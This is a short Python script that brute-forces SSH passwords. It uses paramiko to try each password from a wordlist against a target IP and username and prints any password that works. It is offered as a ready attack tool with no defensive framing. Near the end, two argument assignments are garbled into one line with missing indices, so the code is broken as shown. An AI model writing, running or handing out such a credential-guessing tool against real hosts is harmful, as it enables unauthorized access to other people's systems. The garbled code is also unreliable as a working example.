import paramiko
import sys

def ssh_brute_force(ip, username, password_file):
    with open(password_file, 'r') as file:
        for line in file:
            password = line.strip()
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, username=username, password=password)
                print(f"Success: Password found - {password}")
                ssh.close()
                return
            except paramiko.AuthenticationException:
                print(f"Failed: {password}")
            except Exception as e:
                print(f"Error: {e}")
                break
    print("Password not found in the list.")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python ssh_brute_force.py <target_ip> <username> <wordlist.txt>")
        sys.exit(1)

    target_ip = sys.argv[1]
    username = sys.argv    wordlist = sys.argv

    ssh_brute_force(target_ip, username, wordlist)